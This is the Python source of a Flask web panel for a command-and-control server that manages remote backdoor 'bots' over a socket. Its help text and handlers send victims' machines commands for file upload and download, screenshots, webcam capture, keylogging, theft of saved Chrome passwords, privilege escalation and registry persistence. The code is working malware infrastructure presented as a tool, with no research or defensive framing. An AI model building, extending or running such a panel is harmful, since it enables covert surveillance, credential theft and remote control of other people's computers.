from flask import Flask, render_template, jsonify, request
import json
import os
import socket
from bot import Bot
from title import title
import threading
from werkzeug.utils import secure_filename
from datetime import datetime
import logging

app = Flask(__name__)

# Global variables
start_flag = True
sock = None
t1 = None

# Add these constants after the existing ones
UPLOAD_FOLDER = 'uploads'
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif', 'exe'}
HELP_TEXT = '''
Available Commands:
------------------
Basic Commands:
  help                  --> Show this help message
  quit                  --> Quit Session With The Target
  clear                 --> Clear The Screen
  cd <directory>        --> Changes Directory On Target System

File Operations:
  upload <file>         --> Upload File To The Target Machine From uploads/ Directory
  download <file>       --> Download File From Target Machine
  get <url>            --> Download File From Specified URL to Target ./

Surveillance:
  screenshot           --> Takes screenshot and sends to server ./images/screenshots/
  webcam              --> Takes image with webcam and sends to ./images/webcam/
  keylog_start        --> Start The Keylogger
  keylog_dump         --> Print Keystrokes From taskmanager.txt
  keylog_stop         --> Stop And Self Destruct Keylogger File
  chrome_pass         --> Retrieves Browser Saved Passwords

System Commands:
  start <program>      --> Spawn Program Using backdoor (e.g. 'start notepad')
  check               --> Check If Has Administrator Privileges
  privilege           --> Attempt to escalate privileges
  remove_backdoor     --> Removes backdoor from target

Windows Specific:
  persistence <RegName> <filename>  --> Create Persistence In Registry
'''

# Add this configuration after creating the Flask app
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# Set up logging after Flask app creation
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('server.log'),
        logging.StreamHandler()
    ]
)

def initialise_socket():
    import socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', 5555))
    sock.listen(5)
    sock.settimeout(5)  # Set timeout for accept()
    return sock

def accept_connections():
    logging.info("C2 Server started and listening for connections...")
    while True:
        if not start_flag:
            break
        try:
            target, ip = sock.accept()
            try:
                bot = Bot(target, ip)
                logging.info(f"New agent connected - IP: {ip[0]}:{ip[1]} | Session ID: {bot.id}")
            except Exception as e:
                logging.error(f"Error creating bot instance: {e}")
            print(f'{ip} has connected!')
        except socket.timeout:
            continue
        except Exception as e:
            logging.error(f"Error accepting connection: {e}")

@app.route('/')
def index():
    return render_template('index.html', title=title())

@app.route('/api/targets')
def get_targets():
    targets = []
    for bot_id in Bot.botList:
        bot = Bot.botList[bot_id]
        targets.append({
            'id': bot.id,
            'ip': str(bot.ip),
            'alias': bot.alias
        })
    return jsonify(targets)

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/api/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        return jsonify({'message': f'File {filename} uploaded successfully',
                       'path': filepath})

@app.route('/api/send_command', methods=['POST'])
def send_command():
    data = request.get_json()
    session_id = int(data.get('session_id'))
    command = data.get('command')
    
    # Handle help command locally
    if command == 'help':
        return jsonify({'result': HELP_TEXT})
    
    if session_id not in Bot.botList:
        logging.warning(f"Invalid session ID attempted: {session_id}")
        return jsonify({'error': 'Invalid session ID'}), 400
        
    bot = Bot.botList[session_id]
    logging.info(f"Command sent to Session {session_id} ({bot.ip}): {command}")
    
    if command == 'quit':
        result = bot.kill()
        logging.info(f"Session {session_id} ({bot.ip}) terminated")
        return jsonify({'message': result})
    
    # Handle file upload commands
    if command.startswith('upload '):
        filename = command.split(' ')[1]
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], secure_filename(filename))
        if not os.path.exists(filepath):
            return jsonify({'error': f'File {filename} not found in uploads folder'}), 404
        bot.reliable_send(command)
        result = bot.upload_file(filepath)
        return jsonify({'result': result})
    
    # Handle file download commands
    if command.startswith('download '):
        bot.reliable_send(command)
        result = bot.download_file(command.split(' ')[1])
        return jsonify({'result': result})
    
    # Handle screenshot command
    if command == 'screenshot':
        bot.reliable_send(command)
        result = bot.screenshot()
        return jsonify({'result': result})
    
    # Handle webcam command
    if command == 'webcam':
        bot.reliable_send(command)
        result = bot.webcam()
        return jsonify({'result': result})
        
    try:
        bot.reliable_send(command)
        result = bot.reliable_recv()
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/set_alias', methods=['POST'])
def set_alias():
    data = request.get_json()
    session_id = data.get('session_id')
    new_alias = data.get('alias')
    
    if session_id not in Bot.botList:
        return jsonify({'error': 'Invalid session ID'}), 400
        
    Bot.botList[session_id].alias = new_alias
    return jsonify({'message': 'Alias updated successfully'})

def start_server():
    global sock, t1
    sock = initialise_socket()
    t1 = threading.Thread(target=accept_connections)
    t1.start()

if __name__ == '__main__':
    start_server()
    app.run(debug=True, use_reloader=False) 